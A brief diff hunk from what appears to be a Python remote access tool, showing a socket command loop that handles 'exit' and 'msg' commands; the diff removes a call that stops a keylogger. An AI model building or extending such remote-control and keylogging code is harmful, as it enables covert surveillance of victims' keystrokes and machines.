@@ -338,7 +338,6 @@ while True:
 
             if strData == "exit":
                 objSocket.close()
-                keylogger("stop")
                 sys.exit(0)
             elif strData[:3] == "msg":
                 MessageBox(strData[3:])
